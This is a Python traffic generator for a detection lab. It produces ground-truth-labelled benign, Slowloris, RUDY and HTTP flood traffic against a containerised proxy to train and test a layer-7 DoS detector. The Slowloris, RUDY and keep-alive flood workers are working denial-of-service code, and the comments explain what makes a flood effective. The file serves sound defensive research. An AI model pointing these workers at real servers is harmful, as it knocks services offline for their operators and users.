#!/usr/bin/env python3
"""
generate.py — produce labelled traffic, with ground truth from the generator.

WHY WE GENERATE INSTEAD OF ONLY USING CIC-IDS2017
--------------------------------------------------
The public dataset cannot support this project, for three reasons that are
documented rather than guessed:

  1. The only two DoS attacks that actually worked in CIC-IDS2017 were
     Slowloris and SlowHTTPtest — BOTH slow. There is no working flood in it.
     Hulk was mis-implemented (it needs HTTP keep-alive; all recorded Hulk
     traffic used `Connection: close`), so it behaves like browsing.
     Result: training only on CIC-IDS2017 means the flood branch of the
     mechanism switch has nothing to learn from.

  2. Its 85 CICFlowMeter columns do not map onto our FlowRecord. Every join
     is a hand-written translation, and the features that matter most for slow
     attacks (is the header complete? has the declared body arrived?) are not
     among them.

  3. Its labels come from the attacker's intent, not from measured behaviour.

Generating our own fixes all three at once:
  * every attack class we need, including a working flood
  * features come from our own sensor, so there is no column translation
  * the label is the SOURCE CONTAINER, so labelling is exact and free

CIC-IDS2017 is still used, for the dataset audit and as a secondary check.

GROUND TRUTH BY CONTAINER
-------------------------
Each generator runs in its own container with its own IP. The capture is on
the proxy's interface, so we can label by source IP:

    legit-loadgen  -> benign
    slow-gen       -> slowloris / rudy
    flood-gen      -> flood

That label is objective. No heuristics, no manual annotation.

AUTHORISATION: run only against containers you control, with the signed
authorisation sheet in the repo. Never against anything you do not own.
"""
from __future__ import annotations

import argparse
import asyncio
import random
import time

# Targets are resolved by container name on the lab network.
LAB_HOST = "proxy"
LAB_PORT = 80

# Source IPs this container may bind to (one per worker). Empty = bind nothing
# (kernel picks the primary IP). Populated from --ip-base/--ip-count.
#
# WHY: with a single source IP per container, every worker shares one entity, so
# the model's per-entity features (concurrency, etc.) collapse all workers into
# one client and can leak IP identity. Binding each worker to its own IP makes
# "one client = one IP" true, which is how the real world looks.
SRC_IPS: list[str] = []


async def _connect(src_ip: str | None = None):
    """Open a TCP connection, optionally pinned to a specific source IP."""
    if src_ip:
        return await asyncio.open_connection(
            LAB_HOST, LAB_PORT, local_addr=(src_ip, 0))
    return await asyncio.open_connection(LAB_HOST, LAB_PORT)


def _gt_header(gt_label: str) -> bytes:
    """Ground-truth header embedded in every request so the sensor can label
    per-flow without relying on source IP. The model never sees this header."""
    return f"X-Ground-Truth: {gt_label}\r\n".encode()


# ---------------------------------------------------------------------------
# BENIGN — must look realistic, including the awkward cases
# ---------------------------------------------------------------------------
async def benign_worker(agent: int, duration: int, think_lo: float,
                        think_hi: float, slow_fraction: float = 0.15,
                        stagger: float = 0.0, src_ip: str | None = None):
    """A realistic browser session.

    Reconnects periodically. A browser does NOT hold one socket open for the
    whole run, and one-socket-per-agent would create every benign flow at t=0 —
    which breaks any time-based train/val split (all benign would land in train).

    slow_fraction deliberately produces SLOW BUT FINITE requests: a user on a
    bad connection who takes 8 seconds to upload a 2 MB form. This is the hard
    negative. Without it, the stall detector will flag every large upload and
    the false-positive rate in the report will be fiction.
    """
    end = time.time() + duration
    if stagger > 0:
        await asyncio.sleep(random.uniform(0.0, stagger))
    uid = f"u{agent}"
    gt_header = _gt_header("benign")

    while time.time() < end:
        reader, writer = await _connect(src_ip)
        for _ in range(random.randint(1, 3)):
            if time.time() >= end:
                break
            slow = random.random() < slow_fraction
            body_len = (random.randint(200_000, 2_000_000) if slow
                        else random.randint(0, 4000))

            head = (f"POST /api/form/{uid} HTTP/1.1\r\n"
                    f"Host: api\r\n"
                    f"User-Agent: Mozilla/5.0 ({uid})\r\n"
                    f"Content-Length: {body_len}\r\n"
                    f"Content-Type: multipart/form-data\r\n").encode()
            head += gt_header + b"\r\n"

            if slow:
                # the nasty case: a genuinely slow client that DOES finish
                writer.write(head)
                await writer.drain()
                chunk = b"x" * 8192
                sent = 0
                while sent < body_len and time.time() < end:
                    writer.write(chunk)
                    await writer.drain()
                    sent += len(chunk)
                    await asyncio.sleep(random.uniform(0.3, 0.9))
            else:
                body = b"x" * body_len if body_len else b""
                writer.write(head + body)
                await writer.drain()

            # read the response so keep-alive stays alive
            try:
                await asyncio.wait_for(reader.read(4096), timeout=10)
            except asyncio.TimeoutError:
                pass

            await asyncio.sleep(random.uniform(think_lo, think_hi))

        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await asyncio.sleep(random.uniform(0.05, 0.4))


# ---------------------------------------------------------------------------
# SLOWLORIS — header never terminates, connection never closes
# ---------------------------------------------------------------------------
async def slowloris_worker(conn_id: int, duration: int,
                           keepalive_interval: float = 1.0,
                           stagger: float = 0.0, src_ip: str | None = None):
    """Open a connection and send an HTTP header that NEVER terminates.

    The header is missing its terminating blank line (the final CRLF CRLF), so
    the request is never complete and the server must hold a worker slot. Extra
    header lines are dribbled periodically so the connection stays open for the
    whole run instead of hitting the server's header timeout.

    This is what Slowloris actually is: many long-held, never-finishing
    requests. Sending the blank line (as an earlier version did) turns this into
    a normal request followed by an idle keep-alive socket — a different attack,
    and not what the header_complete / stall features are meant to capture.
    """
    end = time.time() + duration
    if stagger > 0:
        await asyncio.sleep(random.uniform(0.0, stagger))
    if time.time() >= end:
        return
    reader, writer = await _connect(src_ip)
    gt_header = _gt_header("slow")
    # NOTE: ends with a single CRLF — the terminating blank line is omitted.
    writer.write(f"GET /api/search?q={'y' * 70}&u={conn_id} HTTP/1.1\r\n"
                 f"Host: api\r\nUser-Agent: curl/7.81.0\r\n".encode())
    writer.write(gt_header)  # gt_header already ends with \r\n; NO extra \r\n -> header never completes
    await writer.drain()

    # keep the header open: dribble a harmless header line, still no blank line
    while time.time() < end:
        writer.write(f"X-keepalive: {random.randint(1, 99999)}\r\n".encode())
        await writer.drain()
        await asyncio.sleep(random.uniform(keepalive_interval * 0.5,
                                           keepalive_interval * 1.5))
    writer.close()


# ---------------------------------------------------------------------------
# RUDY — valid complete header, enormous Content-Length, body trickled
# ---------------------------------------------------------------------------
async def rudy_worker(conn_id: int, duration: int,
                      declared: int = 5_000_000, chunk: int = 10,
                      interval: float = 0.5, stagger: float = 0.0,
                      src_ip: str | None = None):
    end = time.time() + duration
    if stagger > 0:
        await asyncio.sleep(random.uniform(0.0, stagger))
    if time.time() >= end:
        return
    reader, writer = await _connect(src_ip)
    gt_header = _gt_header("rudy")
    head = (f"POST /api/upload/{conn_id} HTTP/1.1\r\n"
            f"Host: api\r\nContent-Length: {declared}\r\n"
            f"Content-Type: application/octet-stream\r\n").encode()
    head += gt_header + b"\r\n"
    writer.write(head)
    await writer.drain()

    while time.time() < end:
        writer.write(b"x" * chunk)
        await writer.drain()
        await asyncio.sleep(interval)
    writer.close()


# ---------------------------------------------------------------------------
# FLOOD — high rate, keep-alive, every request complete
# ---------------------------------------------------------------------------
async def flood_worker(conn_id: int, duration: int, req_per_conn: int = 200,
                       stagger: float = 0.0, src_ip: str | None = None):
    """A working HTTP flood.

    Keep-alive is used deliberately. With `Connection: close` each request costs
    a fresh TCP handshake, which throttles the attack to the handshake rate —
    that is the bug that made Hulk ineffective in CIC-IDS2017. Reusing the
    connection is what lets one connection sustain thousands of requests/sec.
    """
    end = time.time() + duration
    if stagger > 0:
        await asyncio.sleep(random.uniform(0.0, stagger))
    if time.time() >= end:
        return
    reader, writer = await _connect(src_ip)
    gt_header = _gt_header("flood")

    while time.time() < end:
        for _ in range(req_per_conn):
            req = (b"GET /api/items HTTP/1.1\r\nHost: api\r\n"
                   b"Connection: keep-alive\r\n"
                   b"User-Agent: Mozilla/5.0\r\n")
            req += gt_header + b"\r\n"
            writer.write(req)
        await writer.drain()
        try:
            await asyncio.wait_for(reader.read(65536), timeout=2)
        except asyncio.TimeoutError:
            pass
        # Pace bursts (nginx answers instantly on a LAN, so without this the
        # loop runs at TCP-drain speed and the pcap balloons; a steady ~20
        # bursts/s per worker is still a high-rate flood vs benign ~1 req/s).
        await asyncio.sleep(random.uniform(0.03, 0.06))
    writer.close()


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------
def _ip_for(i: int) -> str | None:
    """Pick this worker's source IP from the container's pool (if any)."""
    if not SRC_IPS:
        return None
    return SRC_IPS[i % len(SRC_IPS)]


async def run_mix(duration: int, n_benign: int, n_slow: int, n_rudy: int,
                  n_flood: int, label: str, stagger: float | None = None,
                  req_per_conn: int = 200):
    """Run the requested attack workers from THIS container.

    n_benign exists for completeness but must stay 0 in attack containers:
    flows are labelled by source container IP, so benign traffic sent from an
    attack container would be mislabelled. Run legit-loadgen concurrently for
    benign load.

    stagger spreads connection start times across the run so flows are not all
    created at t=0 (a chronological train/val split needs both classes spread
    over time).
    """
    if stagger is None:
        stagger = duration * 0.6
    tasks = []
    for i in range(n_benign):
        tasks.append(benign_worker(i, duration, 0.2, 2.0, stagger=stagger,
                                   src_ip=_ip_for(i)))
    for i in range(n_slow):
        tasks.append(slowloris_worker(i, duration, stagger=stagger,
                                      src_ip=_ip_for(i)))
    for i in range(n_rudy):
        tasks.append(rudy_worker(i, duration, stagger=stagger,
                                 src_ip=_ip_for(i)))
    for i in range(n_flood):
        tasks.append(flood_worker(i, duration, req_per_conn=req_per_conn,
                                  stagger=stagger, src_ip=_ip_for(i)))

    print(f"[{label}] {n_benign} benign + {n_slow} slowloris + "
          f"{n_rudy} rudy + {n_flood} flood, for {duration}s")
    await asyncio.gather(*tasks, return_exceptions=True)


async def run_benign_only(duration: int, n_benign: int, label: str,
                          stagger: float | None = None):
    """Benign-only run. THIS is the run that produces the false-positive rate.

    Measure every trigger's FPR here. Tuning thresholds on traffic that
    contains attacks guarantees a flattering and meaningless number.
    """
    if stagger is None:
        stagger = duration * 0.6
    tasks = [benign_worker(i, duration, 0.2, 2.0, stagger=stagger,
                           src_ip=_ip_for(i))
             for i in range(n_benign)]
    print(f"[{label}] benign only: {n_benign} agents, {duration}s "
          f"(this run gives the FPR)")
    await asyncio.gather(*tasks, return_exceptions=True)


# ---------------------------------------------------------------------------
# MIXED — real-world hosts do not stay in one lane. One source IP may browse
# like a normal user and later turn attacker (or the reverse), or do both at
# once. Labels stay PER-FLOW because every request still carries its own
# X-Ground-Truth header, so a mixed IP is labelled correctly flow by flow.
# ---------------------------------------------------------------------------
MIXED_PROFILES = [
    "benign_only",             # innocent user — never attacks
    "slow_only",               # pure slowloris bot
    "flood_only",              # pure flood bot
    "rudy_only",               # pure rudy bot
    "benign_then_slow",        # real work, then turns slowloris (compromised host)
    "benign_then_flood",       # real work, then floods
    "benign_then_rudy",        # real work, then rudy
    "slow_then_benign",        # attacks, then goes quiet/innocent
    "flood_then_benign",       # flood stops, host looks normal again
    "rudy_then_benign",        # rudy stops, host looks normal again
    "benign_concurrent_slow",  # browsing WHILE holding slowloris sockets
    "slow_and_flood",          # dual-technique bot
]


async def _bounded(coro, timeout: float):
    """Await one worker phase but never let it hang or abort the whole IP.

    A ConnectionResetError, a stalled drain() or a timeout in one phase must
    NOT stop the other phase of the same profile -- that bug silently killed
    every benign->attack example in the first mixed capture, because the two
    phases were sequenced with `await a; await b` and `a` raised / hung.
    """
    try:
        return await asyncio.wait_for(coro, timeout=timeout)
    except Exception:
        return None


async def _after(delay: float, coro):
    if delay > 0:
        await asyncio.sleep(delay)
    return await coro


async def mixed_ip_worker(i: int, profile: str, duration: int,
                          req_per_conn: int = 50, src_ip: str | None = None):
    """One source IP plays one real-world profile.

    Phased profiles run their two halves on the SAME IP: phase B is scheduled
    with a time offset and gathered CONCURRENTLY with phase A, so a reset or
    stall in one half can never prevent the other half from running. Every
    phase is time-bounded so a stalled socket cannot keep the generator alive.
    The per-request X-Ground-Truth header keeps the labelling exact per flow.
    """
    half = max(1, duration // 2)
    span = duration + 15      # hard cap for a full-length phase
    hspan = half + 15         # hard cap for a half-length phase

    def ben(dur, stagger):
        return _bounded(benign_worker(i, dur, 0.2, 2.0, stagger=stagger,
                                      src_ip=src_ip), dur + 15)

    if profile == "benign_only":
        await ben(duration, duration * 0.6)
    elif profile == "slow_only":
        await _bounded(slowloris_worker(i, duration, stagger=duration * 0.6, src_ip=src_ip), span)
    elif profile == "flood_only":
        await _bounded(flood_worker(i, duration, req_per_conn=req_per_conn, stagger=duration * 0.6, src_ip=src_ip), span)
    elif profile == "rudy_only":
        await _bounded(rudy_worker(i, duration, stagger=duration * 0.6, src_ip=src_ip), span)
    elif profile == "benign_then_slow":
        await asyncio.gather(ben(half, 0.0),
                             _after(half, _bounded(slowloris_worker(i, half, src_ip=src_ip), hspan)))
    elif profile == "benign_then_flood":
        await asyncio.gather(ben(half, 0.0),
                             _after(half, _bounded(flood_worker(i, half, req_per_conn=req_per_conn, src_ip=src_ip), hspan)))
    elif profile == "benign_then_rudy":
        await asyncio.gather(ben(half, 0.0),
                             _after(half, _bounded(rudy_worker(i, half, src_ip=src_ip), hspan)))
    elif profile == "slow_then_benign":
        await asyncio.gather(_bounded(slowloris_worker(i, half, src_ip=src_ip), hspan),
                             _after(half, ben(half, 0.0)))
    elif profile == "flood_then_benign":
        await asyncio.gather(_bounded(flood_worker(i, half, req_per_conn=req_per_conn, src_ip=src_ip), hspan),
                             _after(half, ben(half, 0.0)))
    elif profile == "rudy_then_benign":
        await asyncio.gather(_bounded(rudy_worker(i, half, src_ip=src_ip), hspan),
                             _after(half, ben(half, 0.0)))
    elif profile == "benign_concurrent_slow":
        await asyncio.gather(ben(duration, duration * 0.6),
                             _bounded(slowloris_worker(i, duration, stagger=duration * 0.6, src_ip=src_ip), span))
    elif profile == "slow_and_flood":
        await asyncio.gather(_bounded(slowloris_worker(i, duration, stagger=duration * 0.6, src_ip=src_ip), span),
                             _bounded(flood_worker(i, duration, req_per_conn=req_per_conn, stagger=duration * 0.6, src_ip=src_ip), span))
    else:
        raise ValueError(f"unknown mixed profile: {profile}")


async def run_mixed(duration: int, n_ips: int, label: str, req_per_conn: int = 50):
    """N source IPs, each playing a profile from MIXED_PROFILES in round-robin,
    so every profile appears and the whole spread is covered."""
    tasks = [mixed_ip_worker(i, MIXED_PROFILES[i % len(MIXED_PROFILES)],
                             duration, req_per_conn=req_per_conn, src_ip=_ip_for(i))
             for i in range(n_ips)]
    print(f"[{label}] mixed: {n_ips} IPs over {len(MIXED_PROFILES)} profiles, "
          f"{duration}s (per-flow labels via X-Ground-Truth)")
    await asyncio.gather(*tasks, return_exceptions=True)


def main() -> None:
    ap = argparse.ArgumentParser(
        description="Generate labelled L7 attack traffic against the lab proxy")
    ap.add_argument("--mode", required=True,
                    choices=["benign", "mix", "slow", "rudy", "flood", "mixed"])
    ap.add_argument("--duration", type=int, default=120)
    ap.add_argument("--benign", type=int, default=50)
    ap.add_argument("--slow", type=int, default=200)
    ap.add_argument("--rudy", type=int, default=100)
    ap.add_argument("--flood", type=int, default=20)
    ap.add_argument("--req-per-conn", type=int, default=200,
                    help="flood: requests written per write() burst "
                         "(lower = smaller pcaps, same high-rate signature)")
    ap.add_argument("--mixed", type=int, default=0,
                    help="mixed mode: N source IPs, each playing a real-world "
                         "benign/attack/switch profile (per-flow labels)")
    ap.add_argument("--label", default="run")
    ap.add_argument("--ip-base", default=None,
                    help="e.g. 172.18.16) bind worker i to <base>.<i+1>")
    ap.add_argument("--ip-count", type=int, default=0,
                    help="number of distinct source IPs to rotate over")
    args = ap.parse_args()

    global SRC_IPS
    if args.ip_base and args.ip_count > 0:
        SRC_IPS = [f"{args.ip_base}.{i}" for i in range(1, args.ip_count + 1)]
        print(f"source IP pool: {SRC_IPS[0]} .. {SRC_IPS[-1]} "
              f"({len(SRC_IPS)} IPs)")

    # IMPORTANT: an attack container must emit ONLY attack traffic.
    # The label is the source container IP, so any benign flow sent from
    # slow-gen/flood-gen would be recorded with y=1 (mislabelled). Benign load
    # is produced by legit-loadgen only, run at the same time for realism.
    if args.mode == "benign":
        asyncio.run(run_benign_only(args.duration, args.benign, args.label))
    elif args.mode == "slow":
        asyncio.run(run_mix(args.duration, 0, args.slow, 0, 0, args.label))
    elif args.mode == "rudy":
        asyncio.run(run_mix(args.duration, 0, 0, args.rudy, 0, args.label))
    elif args.mode == "flood":
        asyncio.run(run_mix(args.duration, 0, 0, 0, args.flood, args.label,
                            req_per_conn=args.req_per_conn))
    elif args.mode == "mixed":
        asyncio.run(run_mixed(args.duration, args.mixed, args.label,
                              req_per_conn=args.req_per_conn))
    else:  # mix: all three attacks from this one attack container
        asyncio.run(run_mix(args.duration, 0, args.slow, args.rudy,
                            args.flood, args.label))


if __name__ == "__main__":
    main()
